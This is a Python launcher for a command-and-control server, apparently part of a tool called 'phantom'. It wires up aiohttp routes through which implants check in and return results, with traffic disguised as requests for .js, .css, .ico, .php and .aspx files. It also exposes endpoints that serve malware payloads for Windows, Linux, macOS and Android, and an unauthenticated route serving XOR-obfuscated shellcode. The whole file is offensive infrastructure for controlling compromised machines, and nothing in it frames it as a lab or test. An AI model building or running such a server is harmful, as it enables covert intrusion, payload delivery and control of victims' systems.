import sys, os, asyncio
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
os.chdir(os.path.dirname(os.path.abspath(__file__)))

if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

from dotenv import load_dotenv
load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))

from aiohttp import web
import phantom.core.c2_server as srv

app = web.Application(client_max_size=50*1024*1024)

# Check-in (real + malleable)
app.router.add_get('/api/v1/ping', srv.handle_checkin)
app.router.add_post('/api/v1/ping', srv.handle_checkin)
app.router.add_get('/{path:.*\.js}', srv.handle_checkin)
app.router.add_post('/{path:.*\.js}', srv.handle_checkin)
app.router.add_get('/{path:.*\.css}', srv.handle_checkin)
app.router.add_post('/{path:.*\.css}', srv.handle_checkin)
app.router.add_get('/{path:.*\.ico}', srv.handle_checkin)
app.router.add_post('/{path:.*\.ico}', srv.handle_checkin)

# Result submission (real + malleable)
app.router.add_post('/api/v1/result', srv.handle_result)
app.router.add_post('/{path:.*\.php}', srv.handle_result)
app.router.add_post('/{path:.*\.aspx}', srv.handle_result)

# Payload download (multi-platform)
app.router.add_get('/api/v1/payload', srv.handle_payload)
app.router.add_get('/api/v1/payload_linux', srv.handle_payload)
app.router.add_get('/api/v1/payload_linux_x86', srv.handle_payload)
app.router.add_get('/api/v1/payload_macos', srv.handle_payload)
app.router.add_get('/api/v1/payload_android', srv.handle_payload)

# XOR-obfuscated PIC shellcode (no auth)
app.router.add_get('/x', srv.handle_payload_pic)

print('READY', flush=True)
web.run_app(app, host='127.0.0.1', port=8080, print=lambda *a: None)
